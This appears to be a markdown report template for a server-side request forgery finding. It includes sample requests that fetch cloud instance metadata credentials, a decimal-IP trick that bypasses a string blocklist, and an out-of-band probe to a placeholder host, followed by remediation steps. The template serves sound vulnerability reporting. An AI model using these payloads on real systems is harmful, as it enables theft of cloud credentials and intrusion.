# SSRF Finding — Report Template

```markdown
## SSRF: <feature> allows internal/cloud metadata access

**Severity**: High/Critical (CVSS 8.6-9.8 depending on metadata creds proof)
**Asset**: https://target.example.com/import?url=
**Type**: CWE-918 Server-Side Request Forgery

### Vulnerable request

```
GET /import?url=https://<oob-host>/probe1 HTTP/1.1
Host: target.example.com
```

OOB evidence (interactsh log): DNS + HTTP callbacks from <egress IP>
at <timestamp> — see evidence/interactsh.log lines 12-18.

### Cloud metadata access

```
GET /import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role
```
Response excerpt (redacted):
```json
{"AccessKeyId":"ASIA****REDACTED","SecretAccessKey":"****","Token":"****"}
```
Verification: `sts get-caller-identity` shows role arn:aws:iam::1234:role/app-role
(screenshot with secrets masked). No resources were listed or modified.

### Filter behavior observed

- Direct 169.254.169.254 blocked -> decimal IP 2852039166 accepted,
  proving naive string blocklist rather than egress control.

### Impact

- Instance role credentials retrievable by any authenticated user ->
  potential full S3 bucket access per attached policy.
- Internal service map exposed (ports 3000, 8080 responded with distinct apps).

### Remediation

1. Enforce IMDSv2 (`HttpTokens=required`, `HttpPutResponseHopLimit=1`).
2. Egress allowlist for outbound fetches; resolve+pin IPs, re-check post-redirect.
3. Deny link-local/metadata ranges at the network layer, not string filters.
4. Never render raw upstream bodies back to clients.
```
